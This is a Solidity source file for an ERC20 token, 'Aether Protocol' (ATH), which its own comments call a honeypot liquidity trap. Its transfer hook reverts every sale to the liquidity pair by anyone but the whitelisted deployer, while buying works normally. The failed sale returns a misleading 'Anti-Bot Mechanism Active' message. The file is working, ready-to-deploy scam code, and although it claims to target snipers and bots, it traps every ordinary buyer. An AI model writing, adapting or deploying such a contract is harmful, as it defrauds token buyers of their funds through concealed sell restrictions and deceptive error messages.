// J/contracts/HoneyToken.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// THE HONEYPOT: LIQUIDITY TRAP
// This contract looks like a standard ERC20 but prevents selling.
// Designed to trap snipers and bots.

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract HoneyToken is ERC20, Ownable {
    mapping(address => bool) public whitelist;
    address public pair;

    constructor() ERC20("Aether Protocol", "ATH") {
        _mint(msg.sender, 1000000 * 10**18);
        whitelist[msg.sender] = true;
    }

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }

    // THE HOOK
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        // If selling (to the pair) AND not whitelisted -> REVERT
        // Buying (from the pair) works fine.
        if (to == pair && !whitelist[from]) {
            require(false, "Liquidity Locked: Anti-Bot Mechanism Active");
        }
        super._beforeTokenTransfer(from, to, amount);
    }
}
